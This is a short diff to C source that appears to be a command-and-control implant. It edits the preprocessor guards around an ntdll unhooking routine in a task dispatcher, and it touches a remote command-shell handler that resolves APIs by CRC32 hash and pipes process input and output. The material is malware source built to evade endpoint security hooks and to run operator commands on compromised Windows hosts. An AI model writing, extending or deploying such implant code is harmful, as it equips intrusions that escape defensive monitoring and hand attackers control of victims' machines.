@@ -33,7 +33,7 @@ VOID CommandDispatcher() {
     PVOID    DataBuffer  = NULL;
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand;
-#if CONFIG_UNHOOK == TRUE
+#if CONFIG_UNHOOK >= 1
 
     IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) Instance.Handles.NtdllHandle;
     IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (Instance.Handles.NtdllHandle + pDosHdr->e_lfanew);
@@ -76,7 +76,7 @@ VOID CommandDispatcher() {
                         if ( Commands[FunctionCounter].ID == TaskCommand) {
 
                             // unhook
-#if CONFIG_UNHOOK
+#if CONFIG_UNHOOK >= 1
                             HookingManager(uHookFlag, pCacheClean, Instance.Handles.NtdllHandle, ntdll_size);
                             uHookFlag = 2; // set flag to rehook status
 #endif
@@ -265,7 +265,6 @@ VOID CommandShell( PPARSER Parser ){
     LocalFree(*(PVOID *)command_line);
 
     RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlDestroyProcessParameters_CRC32B);
-
     p_RtlDestroyProcessParameters(proc_params);
 
 
@@ -277,7 +276,7 @@ VOID CommandShell( PPARSER Parser ){
     CloseHandle( hStdOutPipeRead );
     CloseHandle( hStdInPipeWrite );
 
-#else
+#else // ELSE (NOT CONFIG_NATIVE)
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
